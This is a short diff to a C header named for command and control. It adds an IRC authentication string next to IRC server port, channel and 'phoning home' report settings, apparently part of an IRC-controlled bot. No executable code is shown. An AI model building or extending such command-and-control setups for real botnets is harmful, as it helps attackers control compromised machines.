@@ -11,5 +11,6 @@
 #define IRC_PORT 6667
 #define IRC_CHANNEL "#et"
 #define IRC_REPORT "phoning home"
+#define IRC_AUTH "et-phone-home"
 
 #endif /* CNC_H */
